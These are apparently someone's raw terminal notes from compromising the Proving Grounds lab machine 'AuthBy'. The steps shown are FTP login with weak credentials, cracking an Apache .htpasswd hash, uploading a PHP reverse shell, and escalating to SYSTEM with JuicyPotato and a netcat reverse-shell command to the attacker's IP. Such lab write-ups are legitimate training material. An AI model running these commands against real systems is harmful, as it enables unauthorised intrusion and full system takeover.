No credentials were provided for this machine

nmap -vvv -T5 -Pn 192.168.164.46 -p- -A -oN nmap.txt

sudo echo "192.168.164.46 authby.offsec" | sudo tee -a /etc/hosts

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ ftp --help
ftp: --: unknown option
usage: ftp [-46AadefginpRtVv] [-N NETRC] [-o OUTPUT] [-P PORT] [-q QUITTIME]
           [-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]] [-x XFERSIZE]
           [[USER@]HOST [PORT]]
           [[USER@]HOST:[PATH][/]]
           [file:///PATH]
           [ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]
           [http://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           [https://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           ...
       ftp -u URL FILE ...
       ftp -?
                                                                                                                                                                                                                                            
┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ ftp ftp://anonymous:@192.168.164.46:21/
Connected to 192.168.164.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
331 User name received, need password.
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Type set to I.
ftp> ls
229 Entering Extended Passive Mode (|||2049|)
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Oct 20 22:56 log
----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Aug 03  2024 accounts
226 Closing data connection.
ftp> get UninstallService.bat
local: UninstallService.bat remote: UninstallService.bat
229 Entering Extended Passive Mode (|||2050|)
550 Access denied
ftp> get StopService.bat
local: StopService.bat remote: StopService.bat
229 Entering Extended Passive Mode (|||2051|)
550 Access denied
ftp> 

http://authby.offsec:242/ --> require passwd

https://nvd.nist.gov/vuln/detail/CVE-2011-4717
https://www.exploit-db.com/exploits/18235 --> delete folder...

ftp> cd accounts
250 CWD Command successful.
ftp> ls
229 Entering Extended Passive Mode (|||2104|)
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Aug 03  2024 backup
----------   1 root     root          764 Aug 03  2024 acc[Offsec].uac
----------   1 root     root         1034 Oct 20 23:10 acc[anonymous].uac
----------   1 root     root          926 Aug 03  2024 acc[admin].uac
226 Closing data connection.
ftp> users
?Invalid command.
ftp> user
(username) admin
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||2105|)
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> pwd
Remote directory: /
ftp> get index.php
local: index.php remote: index.php
229 Entering Extended Passive Mode (|||2120|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************|    76      720.57 KiB/s    00:00 ETA
226 Closing data connection.
76 bytes received in 00:00 (1.13 KiB/s)
ftp> get .htpasswd
local: .htpasswd remote: .htpasswd
229 Entering Extended Passive Mode (|||2121|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************|    45      201.58 KiB/s    00:00 ETA
226 Closing data connection.
45 bytes received in 00:00 (0.63 KiB/s)
ftp> get .htaccess
local: .htaccess remote: .htaccess
229 Entering Extended Passive Mode (|||2122|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************|   161        1.78 MiB/s    00:00 ETA
226 Closing data connection.
161 bytes received in 00:00 (2.34 KiB/s)

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ cat index.php   
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>                                                                                                                                                                                                                                            
┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ rm index.php 
                                                                                                                                                                                                                                            
┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ cat .htaccess 
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>                                                                                                                                                                                                                                            
┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ cat .htpasswd 
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ hash-identifier                                      
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
 HASH: ^C

        Bye!

md5($salt.md5($pass)) Apache $apr1$ MD5, md5apr1, MD5 (APR)

──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ hashcat -hh | grep "APR"   
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ cat hash.txt 
$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu--0x000, 1466/2933 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (1220 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0:elite               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
Time.Started.....: Mon Oct 20 12:42:52 2025 (2 secs)
Time.Estimated...: Mon Oct 20 12:42:54 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    13471 H/s (12.59ms) @ Accel:88 Loops:1000 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 25344/14344385 (0.18%)
Rejected.........: 0/25344 (0.00%)
Restore.Point....: 25168/14344385 (0.18%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#01...: lotsoflove -> 360360
Hardware.Mon.#01.: Util: 99%

Started: Mon Oct 20 12:42:43 2025
Stopped: Mon Oct 20 12:42:55 2025

offsec:elite

FTP --> doesnt work, both port
rdesktop (RDP) --> doesnt work

work here --> http://authby.offsec:242/ 

http://authby.offsec:242/index.php

ftp> put revshell.php
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||2127|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************|  9289       14.33 MiB/s    00:00 ETA
226 Closing data connection.
9289 bytes sent in 00:00 (122.82 KiB/s)

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ cat revshell.php 
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), /
....
....
....

access --> http://authby.offsec:242/revshell.php

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.164.46] 49161
SOCKET: Shell has connected! PID: 712
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>cd C:\

C:\>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\>powershell
'powershell' is not recognized as an internal or external command,
operable program or batch file.

C:\>powershell.exe
'powershell.exe' is not recognized as an internal or external command,
operable program or batch file.

C:\>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\

09/18/2006  02:43 PM                24 autoexec.bat
09/18/2006  02:43 PM                10 config.sys
12/20/2009  04:06 AM    <DIR>          ManageEngine
01/19/2008  02:40 AM    <DIR>          PerfLogs
05/22/2013  06:38 AM    <DIR>          Program Files
07/09/2020  11:07 AM    <DIR>          Users
11/08/2011  04:37 AM    <DIR>          wamp
03/05/2015  04:35 AM    <DIR>          Windows
               2 File(s)             34 bytes
               6 Dir(s)   6,031,761,408 bytes free

C:\>cd Windows

C:\Windows>cd ..

C:\>cd users

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users

07/09/2020  11:07 AM    <DIR>          .
07/09/2020  11:07 AM    <DIR>          ..
02/14/2010  05:16 PM    <DIR>          Administrator
11/08/2011  05:34 AM    <DIR>          apache
01/19/2008  02:40 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   6,031,761,408 bytes free

C:\Users>cd Administrator
Access is denied.

C:\Users>cd apache

C:\Users\apache>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users\apache

11/08/2011  05:34 AM    <DIR>          .
11/08/2011  05:34 AM    <DIR>          ..
11/08/2011  05:34 AM    <DIR>          Contacts
07/09/2020  11:05 AM    <DIR>          Desktop
11/08/2011  05:34 AM    <DIR>          Documents
11/08/2011  05:34 AM    <DIR>          Downloads
11/08/2011  06:02 AM    <DIR>          Favorites
11/08/2011  05:34 AM    <DIR>          Links
11/08/2011  05:34 AM    <DIR>          Music
11/08/2011  05:34 AM    <DIR>          Pictures
11/08/2011  05:34 AM    <DIR>          Saved Games
11/08/2011  05:34 AM    <DIR>          Searches
11/08/2011  05:34 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   6,031,761,408 bytes free

C:\Users\apache>cd desktop

C:\Users\apache\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users\apache\Desktop

07/09/2020  11:05 AM    <DIR>          .
07/09/2020  11:05 AM    <DIR>          ..
10/20/2025  08:53 AM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,031,761,408 bytes free

C:\Users\apache\Desktop>type local.txt
69b3aef4616ef036f66bcf246309510f

ftp> put winPEASany.exe 
local: winPEASany.exe remote: winPEASany.exe
229 Entering Extended Passive Mode (|||2128|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************|  9933 KiB    2.79 MiB/s    00:00 ETA
226 Closing data connection.
10171904 bytes sent in 00:03 (2.76 MiB/s)

C:\wamp\www>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\wamp\www

10/20/2025  10:11 AM    <DIR>          .
10/20/2025  10:11 AM    <DIR>          ..
11/08/2011  08:58 AM               161 .htaccess
11/08/2011  08:53 AM                45 .htpasswd
11/08/2011  08:45 AM                76 index.php
10/20/2025  10:05 AM             9,289 revshell.php
10/20/2025  10:03 AM             2,589 shell.php
10/20/2025  09:58 AM               348 webshell.php
10/20/2025  10:11 AM        10,171,904 winPEASany.exe
               7 File(s)     10,184,412 bytes
               2 Dir(s)   6,021,586,944 bytes free

C:\wamp\www>.\winPEASany.exe --help

C:\wamp\www>cmd.exe
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\www>.\winPEASany.exe --help

C:\wamp\www>.\winPEASany.exe -h

C:\wamp\www>winPEASany.exe -h

C:\wamp\www>.\winPEASany.exe

ftp> put winPEAS.bat 
local: winPEAS.bat remote: winPEAS.bat
229 Entering Extended Passive Mode (|||2129|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************| 36950      416.51 KiB/s    00:00 ETA
226 Closing data connection.
36950 bytes sent in 00:00 (282.31 KiB/s)

C:\wamp\www>.\winPEAS.bat

PRIVILEGES INFORMATION                                                                                                                                                                     
----------------------                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Privilege Name                Description                               State                                                                                                                                                               
============================= ========================================= ========                                                                                                                                                            
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                             
SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                                                                                             
SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                                                                             
SeIncreaseWorkingSetPrivilege Increase a process working set           No User exists for *                                                                                                                                                 
 Disabled

ftp> put JuicyPotato.exe 
local: JuicyPotato.exe remote: JuicyPotato.exe
229 Entering Extended Passive Mode (|||2134|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************|   339 KiB    1.29 MiB/s    00:00 ETA
226 Closing data connection.
347648 bytes sent in 00:00 (1.12 MiB/s)

C:\wamp\www>.\JuicyPotato.exe                                                                                                                                                                                                               
This version of C:\wamp\www\JuicyPotato.exe is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need a x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher. 

ftp> put Juicy.Potato.x86.exe 
local: Juicy.Potato.x86.exe remote: Juicy.Potato.x86.exe
229 Entering Extended Passive Mode (|||2139|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************|   257 KiB    1.38 MiB/s    00:00 ETA
226 Closing data connection.
263680 bytes sent in 00:00 (1.16 MiB/s)

ftp> put nc32.exe
local: nc32.exe remote: nc32.exe
229 Entering Extended Passive Mode (|||2140|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************************************************************************************************| 38616      615.52 KiB/s    00:00 ETA
226 Closing data connection.
38616 bytes sent in 00:00 (397.37 KiB/s)

C:\wamp\www>.\Juicy.Potato.x86.exe -t * -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc32.exe 192.168.45.170 1111 -e cmd.exe" -l 1111 -c "{3c6859ce-230b-48a4-be6c-932c0c202048}"
Testing {3c6859ce-230b-48a4-be6c-932c0c202048} 1111               
....                                                                  
[+] authresult 0
{3c6859ce-230b-48a4-be6c-932c0c202048};NT AUTHORITY\SYSTEM    

[+] CreateProcessWithTokenW OK

┌──(lepotekil㉿kali)-[~/proving-ground-prac/authby]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.164.46] 49168
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users\Administrator\Desktop

07/09/2020  11:02 AM    <DIR>          .
07/09/2020  11:02 AM    <DIR>          ..
10/20/2025  08:53 AM                34 proof.txt
11/08/2011  04:37 AM               471 WampServer.lnk
11/08/2011  04:52 AM               927 zFTPServer Administration.lnk
               3 File(s)          1,432 bytes
               2 Dir(s)   6,031,458,304 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
ebb72ad084414619697046ac002a7336